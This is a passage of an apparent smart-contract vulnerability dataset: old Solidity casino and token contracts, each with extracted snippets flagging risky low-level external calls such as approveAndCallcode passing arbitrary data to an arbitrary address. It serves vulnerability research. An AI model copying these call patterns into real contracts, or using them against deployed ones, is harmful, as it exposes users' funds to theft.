  "content": "pragma solidity ^ 0.4 .17;\ncontract owned {\n address public owner;\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n function owned() public {\n owner = msg.sender;\n }\n function changeOwner(address newOwner) onlyOwner public {\n owner = newOwner;\n }\n}\ncontract mortal is owned {\n function close() onlyOwner public {\n selfdestruct(owner);\n }\n}\ncontract casino is mortal {\n uint public minimumBet;\n uint public maximumBet;\n mapping(address => bool) public authorized;\n event Error(uint8 errorCode);\n function casino(uint minBet, uint maxBet) public {\n minimumBet = minBet;\n maximumBet = maxBet;\n }\n function setMinimumBet(uint newMin) onlyOwner public {\n minimumBet = newMin;\n }\n function setMaximumBet(uint newMax) onlyOwner public {\n maximumBet = newMax;\n }\n function authorize(address addr) onlyOwner public {\n authorized[addr] = true;\n }\n function deauthorize(address addr) onlyOwner public {\n authorized[addr] = false;\n }\n modifier onlyAuthorized {\n require(authorized[msg.sender]);\n _;\n }\n}\ncontract blackjack is casino {\n struct Game {\n bytes32 deck;\n bytes32 seedHash;\n address player;\n uint bet;\n }\n uint8[13] cardValues = [11, 2, 3, 4, 5, 6, 7, 8, 9, 10, 10, 10, 10];\n mapping(bytes32 => Game) games;\n mapping(bytes32 => uint8[]) splits;\n mapping(bytes32 => mapping(uint8 => bool)) doubled;\n mapping(bytes32 => bool) over;\n event NewGame(bytes32 indexed id, bytes32 deck, bytes32 srvSeed, bytes32 cSeed, address player, uint bet);\n event Result(bytes32 indexed id, address player, uint win);\n event Double(bytes32 indexed id, uint8 hand);\n event Split(bytes32 indexed id, uint8 hand);\n function blackjack(uint minBet, uint maxBet) casino(minBet, maxBet) public {\n }\n function initGame(address player, uint value, bytes32 deck, bytes32 srvSeed, bytes32 cSeed) onlyAuthorized public {\n assert(value >= minimumBet && value <= maximumBet);\n assert(!gameExists(srvSeed));\n games[srvSeed] = Game(deck, srvSeed, player, value);\n NewGame(srvSeed, deck, srvSeed, cSeed, player, value);\n }\n function double(bytes32 id, uint8 hand, uint value) onlyAuthorized public {\n Game storage game = games[id];\n require(value == game.bet);\n require(hand <= splits[id].length && !doubled[id][hand]);\n doubled[id][hand] = true;\n Double(id, hand);\n }\n function split(bytes32 id, uint8 hand, uint value) onlyAuthorized public {\n Game storage game = games[id];\n require(value == game.bet);\n require(splits[id].length < 3);\n splits[id].push(hand);\n Split(id, hand);\n }\n function surrender(bytes32 seed) onlyAuthorized public {\n var id = keccak256(seed);\n Game storage game = games[id];\n require(id == game.seedHash);\n require(!over[id]);\n over[id] = true;\n assert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256)\")), game.player, game.bet / 2));\n Result(id, game.player, game.bet / 2);\n }\n function stand(uint8[] deck, bytes32 seed, uint8[] numCards) onlyAuthorized public {\n var gameId = keccak256(seed);\n Game storage game = games[gameId];\n assert(!over[gameId]);\n assert(checkDeck(gameId, deck, seed));\n assert(splits[gameId].length == numCards.length - 1);\n over[gameId] = true;\n uint win = determineOutcome(gameId, deck, numCards);\n if (win > 0) assert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256)\")), game.player, win));\n Result(gameId, game.player, win);\n }\n function gameExists(bytes32 id) constant public returns(bool success) {\n if (games[id].player != 0x0) return true;\n return false;\n }\n function checkDeck(bytes32 gameId, uint8[] deck, bytes32 seed) constant public returns(bool correct) {\n if (keccak256(convertToBytes(deck), seed) != games[gameId].deck) return false;\n return true;\n }\n function convertToBytes(uint8[] byteArray) internal constant returns(bytes b) {\n b = new bytes(byteArray.length);\n for (uint8 i = 0; i < byteArray.length; i++)\n b[i] = byte(byteArray[i]);\n }\n function determineOutcome(bytes32 gameId, uint8[] cards, uint8[] numCards) constant public returns(uint totalWin) {\n Game storage game = games[gameId];\n var playerValues = getPlayerValues(cards, numCards, splits[gameId]);\n var (dealerValue, dealerBJ) = getDealerValue(cards, sum(numCards));\n uint win;\n for (uint8 h = 0; h < numCards.length; h++) {\n uint8 playerValue = playerValues[h];\n if (playerValue > 21) win = 0;\n else if (numCards.length == 1 && playerValue == 21 && numCards[h] == 2 && !dealerBJ) {\n win = game.bet * 5 / 2;\n }\n else if (playerValue > dealerValue || dealerValue > 21)\n win = game.bet * 2;\n else if (playerValue == dealerValue)\n win = game.bet;\n else\n win = 0;\n if (doubled[gameId][h]) win *= 2;\n totalWin += win;\n }\n }\n function getPlayerValues(uint8[] cards, uint8[] numCards, uint8[] pSplits) constant internal returns(uint8[5] playerValues) {\n uint8 cardIndex;\n uint8 splitIndex;\n (cardIndex, splitIndex, playerValues) = playHand(0, 0, 0, playerValues, cards, numCards, pSplits);\n }\n function playHand(uint8 hIndex, uint8 cIndex, uint8 sIndex, uint8[5] playerValues, uint8[] cards, uint8[] numCards, uint8[] pSplits) constant internal returns(uint8, uint8, uint8[5]) {\n playerValues[hIndex] = cardValues[cards[cIndex] % 13];\n cIndex = cIndex < 4 ? cIndex + 2 : cIndex + 1;\n while (sIndex < pSplits.length && pSplits[sIndex] == hIndex) {\n sIndex++;\n (cIndex, sIndex, playerValues) = playHand(sIndex, cIndex, sIndex, playerValues, cards, numCards, pSplits);\n }\n uint8 numAces = playerValues[hIndex] == 11 ? 1 : 0;\n uint8 card;\n for (uint8 i = 1; i < numCards[hIndex]; i++) {\n card = cards[cIndex] % 13;\n playerValues[hIndex] += cardValues[card];\n if (card == 0) numAces++;\n cIndex = cIndex < 4 ? cIndex + 2 : cIndex + 1;\n }\n while (numAces > 0 && playerValues[hIndex] > 21) {\n playerValues[hIndex] -= 10;\n numAces--;\n }\n return (cIndex, sIndex, playerValues);\n }\n function getDealerValue(uint8[] cards, uint8 numCards) constant internal returns(uint8 dealerValue, bool bj) {\n uint8 card = cards[1] % 13;\n uint8 card2 = cards[3] % 13;\n dealerValue = cardValues[card] + cardValues[card2];\n uint8 numAces;\n if (card == 0) numAces++;\n if (card2 == 0) numAces++;\n if (dealerValue > 21) {\n dealerValue -= 10;\n numAces--;\n } else if (dealerValue == 21) {\n return (21, true);\n }\n uint8 i;\n while (dealerValue < 17) {\n card = cards[numCards + i + 2] % 13;\n dealerValue += cardValues[card];\n if (card == 0) numAces++;\n if (dealerValue > 21 && numAces > 0) {\n dealerValue -= 10;\n numAces--;\n }\n i++;\n }\n }\n function sum(uint8[] numbers) constant internal returns(uint8 s) {\n for (uint i = 0; i < numbers.length; i++) {\n s += numbers[i];\n }\n }\n}",
  "extract_feature": [
    "function surrender(bytes32 seed) onlyAuthorized public {\nvar id = keccak256(seed);\nGame storage game = games[id];\nrequire(id == game.seedHash);\nrequire(!over[id]);\nover[id] = true;\nassert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256)\")), game.player, game.bet / 2));\nResult(id, game.player, game.bet / 2);\n}",
    "function stand(uint8[] deck, bytes32 seed, uint8[] numCards) onlyAuthorized public {\nvar gameId = keccak256(seed);\nGame storage game = games[gameId];\nassert(!over[gameId]);\nassert(checkDeck(gameId, deck, seed));\nassert(splits[gameId].length == numCards.length - 1);\nover[gameId] = true;\nuint win = determineOutcome(gameId, deck, numCards);\nif (win > 0) assert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256)\")), game.player, win));\nResult(gameId, game.player, win);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15e2"
  },
  "filename": "36175.sol",
  "content": "pragma solidity ^ 0.4 .17;\ncontract token {\n function transferFrom(address sender, address receiver, uint amount) public returns(bool success) {}\n function transfer(address receiver, uint amount) public returns(bool success) {}\n function balanceOf(address holder) public constant returns(uint) {}\n}\ncontract owned {\n address public owner;\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n function owned() public {\n owner = msg.sender;\n }\n function changeOwner(address newOwner) onlyOwner public {\n owner = newOwner;\n }\n}\ncontract safeMath {\n function safeSub(uint a, uint b) constant internal returns(uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) constant internal returns(uint) {\n uint c = a + b;\n assert(c >= a && c >= b);\n return c;\n }\n function safeMul(uint a, uint b) constant internal returns(uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n}\ncontract casinoBank is owned, safeMath {\n uint public playerBalance;\n mapping(address => uint) public balanceOf;\n mapping(address => uint) public withdrawAfter;\n uint public gasPrice = 20;\n token edg;\n uint public closeAt;\n event Deposit(address _player, uint _numTokens, bool _chargeGas);\n event Withdrawal(address _player, address _receiver, uint _numTokens);\n function casinoBank(address tokenContract) public {\n edg = token(tokenContract);\n }\n function deposit(address receiver, uint numTokens, bool chargeGas) public isAlive {\n require(numTokens > 0);\n uint value = safeMul(numTokens, 10000);\n if (chargeGas) value = safeSub(value, msg.gas / 1000 * gasPrice);\n assert(edg.transferFrom(msg.sender, address(this), numTokens));\n balanceOf[receiver] = safeAdd(balanceOf[receiver], value);\n playerBalance = safeAdd(playerBalance, value);\n Deposit(receiver, numTokens, chargeGas);\n }\n function requestWithdrawal() public {\n withdrawAfter[msg.sender] = now + 7 minutes;\n }\n function cancelWithdrawalRequest() public {\n withdrawAfter[msg.sender] = 0;\n }\n function withdraw(uint amount) public keepAlive {\n require(withdrawAfter[msg.sender] > 0 && now > withdrawAfter[msg.sender]);\n withdrawAfter[msg.sender] = 0;\n uint value = safeMul(amount, 10000);\n balanceOf[msg.sender] = safeSub(balanceOf[msg.sender], value);\n playerBalance = safeSub(playerBalance, value);\n assert(edg.transfer(msg.sender, amount));\n Withdrawal(msg.sender, msg.sender, amount);\n }\n function withdrawBankroll(uint numTokens) public onlyOwner {\n require(numTokens <= bankroll());\n assert(edg.transfer(owner, numTokens));\n }\n function bankroll() constant public returns(uint) {\n return safeSub(edg.balanceOf(address(this)), playerBalance / 10000);\n }\n function close() onlyOwner public {\n if (playerBalance == 0) selfdestruct(owner);\n if (closeAt == 0) closeAt = now + 30 days;\n else if (closeAt < now) selfdestruct(owner);\n }\n function open() onlyOwner public {\n closeAt = 0;\n }\n modifier isAlive {\n require(closeAt == 0);\n _;\n }\n modifier keepAlive {\n if (closeAt > 0) closeAt = now + 30 days;\n _;\n }\n}\ncontract casinoProxy is casinoBank {\n mapping(address => bool) public authorized;\n address[] public casinoGames;\n mapping(address => uint) public count;\n modifier onlyAuthorized {\n require(authorized[msg.sender]);\n _;\n }\n modifier onlyCasinoGames {\n bool isCasino;\n for (uint i = 0; i < casinoGames.length; i++) {\n if (msg.sender == casinoGames[i]) {\n isCasino = true;\n break;\n }\n }\n require(isCasino);\n _;\n }\n function casinoProxy(address authorizedAddress, address blackjackAddress, address tokenContract) casinoBank(tokenContract) public {\n authorized[authorizedAddress] = true;\n casinoGames.push(blackjackAddress);\n }\n function shift(address receiver, uint numTokens) public onlyCasinoGames {\n balanceOf[receiver] = safeAdd(balanceOf[receiver], numTokens);\n playerBalance = safeAdd(playerBalance, numTokens);\n }\n function withdrawFor(address receiver, uint amount, uint8 v, bytes32 r, bytes32 s) public onlyAuthorized keepAlive {\n uint gasCost = msg.gas / 1000 * gasPrice;\n var player = ecrecover(keccak256(receiver, amount, count[receiver]), v, r, s);\n count[receiver]++;\n uint value = safeAdd(safeMul(amount, 10000), gasCost);\n balanceOf[player] = safeSub(balanceOf[player], value);\n playerBalance = safeSub(playerBalance, value);\n assert(edg.transfer(receiver, amount));\n Withdrawal(player, receiver, amount);\n }\n function setGameAddress(uint8 game, address newAddress) public onlyOwner {\n if (game < casinoGames.length) casinoGames[game] = newAddress;\n else casinoGames.push(newAddress);\n }\n function authorize(address addr) public onlyOwner {\n authorized[addr] = true;\n }\n function deauthorize(address addr) public onlyOwner {\n authorized[addr] = false;\n }\n function setGasPrice(uint8 price) public onlyOwner {\n gasPrice = price;\n }\n function move(uint8 game, uint value, bytes data, uint8 v, bytes32 r, bytes32 s) public onlyAuthorized isAlive {\n require(game < casinoGames.length);\n require(safeMul(bankroll(), 10000) > value * 8);\n var player = ecrecover(keccak256(data), v, r, s);\n require(withdrawAfter[player] == 0 || now < withdrawAfter[player]);\n value = safeAdd(value, msg.gas / 1000 * gasPrice);\n balanceOf[player] = safeSub(balanceOf[player], value);\n playerBalance = safeSub(playerBalance, value);\n assert(casinoGames[game].call(data));\n }\n}",
  "extract_feature": [
    "function move(uint8 game, uint value, bytes data, uint8 v, bytes32 r, bytes32 s) public onlyAuthorized isAlive {\nrequire(game < casinoGames.length);\nrequire(safeMul(bankroll(), 10000) > value * 8);\nvar player = ecrecover(keccak256(data), v, r, s);\nrequire(withdrawAfter[player] == 0 || now < withdrawAfter[player]);\nvalue = safeAdd(value, msg.gas / 1000 * gasPrice);\nbalanceOf[player] = safeSub(balanceOf[player], value);\nplayerBalance = safeSub(playerBalance, value);\nassert(casinoGames[game].call(data));\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15e3"
  },
  "filename": "36182.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract CNYTokenPlus is StandardToken {\n function () {\n throw;\n }\n address public founder;\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'CNYt+1.0';\n mapping(address => uint256) nonces;\n mapping(address => string) lastComment;\n mapping (address => mapping (uint256 => string)) comments;\n function CNYTokenPlus(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol) {\n founder = msg.sender;\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function transferWithComment(address _to, uint256 _value, string _comment) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n lastComment[msg.sender] = _comment;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFromWithComment(address _from, address _to, uint256 _value, string _comment) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n lastComment[_from] = _comment;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function transferProxy(address _from, address _to, uint256 _value, uint256 _fee,\n uint8 _v,bytes32 _r, bytes32 _s, string _comment) returns (bool){\n if(balances[_from] < _fee + _value) throw;\n uint256 nonce = nonces[_from];\n bytes32 hash = sha3(_from,_to,_value,_fee,nonce);\n bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\";\n bytes32 prefixedHash = sha3(prefix, hash);\n if(_from != ecrecover(prefixedHash,_v,_r,_s)) throw;\n if(balances[_to] + _value < balances[_to]\n || balances[msg.sender] + _fee < balances[msg.sender]) throw;\n balances[_to] += _value;\n Transfer(_from, _to, _value);\n balances[msg.sender] += _fee;\n Transfer(_from, msg.sender, _fee);\n balances[_from] -= _value + _fee;\n lastComment[_from] = _comment;\n comments[_from][nonce] = _comment;\n nonces[_from] = nonce + 1;\n return true;\n }\n function approveProxy(address _from, address _spender, uint256 _value,\n uint8 _v,bytes32 _r, bytes32 _s, string _comment) returns (bool success) {\n if(balances[_from] < _value) throw;\n uint256 nonce = nonces[_from];\n bytes32 hash = sha3(_from,_spender,_value,nonce);\n bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\";\n bytes32 prefixedHash = sha3(prefix, hash);\n if(_from != ecrecover(prefixedHash,_v,_r,_s)) throw;\n allowed[_from][_spender] = _value;\n Approval(_from, _spender, _value);\n lastComment[_from] = _comment;\n comments[_from][nonce] = _comment;\n nonces[_from] = nonce + 1;\n return true;\n }\n function getNonce(address _addr) constant returns (uint256){\n return nonces[_addr];\n }\n function getLastComment(address _addr) constant returns (string){\n return lastComment[_addr];\n }\n function getSpecifiedComment(address _addr, uint256 _nonce) constant returns (string){\n if (nonces[_addr] < _nonce) throw;\n return comments[_addr][_nonce];\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(_extraData)) { throw; }\n return true;\n }\n event Burn(address indexed from, uint256 value);\n function burn(uint256 _value) returns (bool success) {\n if (balances[msg.sender] < _value) throw;\n balances[msg.sender] -= _value;\n totalSupply -= _value;\n Burn(msg.sender, _value);\n return true;\n }\n function burnFrom(address _from, uint256 _value) returns (bool success) {\n if (balances[_from] < _value) throw;\n if (_value > allowed[_from][msg.sender]) throw;\n balances[_from] -= _value;\n totalSupply -= _value;\n Burn(_from, _value);\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}",
    "function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(_extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15e4"
  },
  "filename": "36184.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract CNYToken is StandardToken {\n function () {\n throw;\n }\n address public founder;\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'CNY1.0';\n mapping(address => uint256) nonces;\n mapping(address => string) lastComment;\n mapping (address => mapping (uint256 => string)) comments;\n function CNYToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol) {\n founder = msg.sender;\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function transferWithComment(address _to, uint256 _value, string _comment) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n lastComment[msg.sender] = _comment;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFromWithComment(address _from, address _to, uint256 _value, string _comment) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n lastComment[_from] = _comment;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function transferProxy(address _from, address _to, uint256 _value, uint256 _fee,\n uint8 _v,bytes32 _r, bytes32 _s, string _comment) returns (bool){\n if(balances[_from] < _fee + _value) throw;\n uint256 nonce = nonces[_from];\n bytes32 hash = sha3(_from,_to,_value,_fee,nonce);\n bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\";\n bytes32 prefixedHash = sha3(prefix, hash);\n if(_from != ecrecover(prefixedHash,_v,_r,_s)) throw;\n if(balances[_to] + _value < balances[_to]\n || balances[msg.sender] + _fee < balances[msg.sender]) throw;\n balances[_to] += _value;\n Transfer(_from, _to, _value);\n balances[msg.sender] += _fee;\n Transfer(_from, msg.sender, _fee);\n balances[_from] -= _value + _fee;\n lastComment[_from] = _comment;\n comments[_from][nonce] = _comment;\n nonces[_from] = nonce + 1;\n return true;\n }\n function approveProxy(address _from, address _spender, uint256 _value,\n uint8 _v,bytes32 _r, bytes32 _s, string _comment) returns (bool success) {\n if(balances[_from] < _value) throw;\n uint256 nonce = nonces[_from];\n bytes32 hash = sha3(_from,_spender,_value,nonce);\n bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\";\n bytes32 prefixedHash = sha3(prefix, hash);\n if(_from != ecrecover(prefixedHash,_v,_r,_s)) throw;\n allowed[_from][_spender] = _value;\n Approval(_from, _spender, _value);\n lastComment[_from] = _comment;\n comments[_from][nonce] = _comment;\n nonces[_from] = nonce + 1;\n return true;\n }\n function getNonce(address _addr) constant returns (uint256){\n return nonces[_addr];\n }\n function getLastComment(address _addr) constant returns (string){\n return lastComment[_addr];\n }\n function getSpecifiedComment(address _addr, uint256 _nonce) constant returns (string){\n if (nonces[_addr] < _nonce) throw;\n return comments[_addr][_nonce];\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(_extraData)) { throw; }\n return true;\n }\n event Burn(address indexed from, uint256 value);\n function burn(uint256 _value) returns (bool success) {\n if (balances[msg.sender] < _value) throw;\n balances[msg.sender] -= _value;\n totalSupply -= _value;\n Burn(msg.sender, _value);\n return true;\n }\n function burnFrom(address _from, uint256 _value) returns (bool success) {\n if (balances[_from] < _value) throw;\n if (_value > allowed[_from][msg.sender]) throw;\n balances[_from] -= _value;\n totalSupply -= _value;\n Burn(_from, _value);\n return true;\n }\n event Increase(address _to, uint256 _value);\n function allocateTokens(address _to, uint256 _value) {\n if(msg.sender != founder) throw;\n if(totalSupply + _value <= totalSupply || balances[_to] + _value <= balances[_to]) throw;\n totalSupply += _value;\n balances[_to] += _value;\n Increase(_to,_value);\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}",
    "function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(_extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15e5"
  },
  "filename": "36185.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EtherBB is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EtherBB(\n ) {\n balances[msg.sender] = 1000000000000000000;\n totalSupply = 1000000000000000000;\n name = \"EtherBB\";\n decimals = 9;\n symbol = \"BB\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15e6"
  },
  "filename": "36190.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract 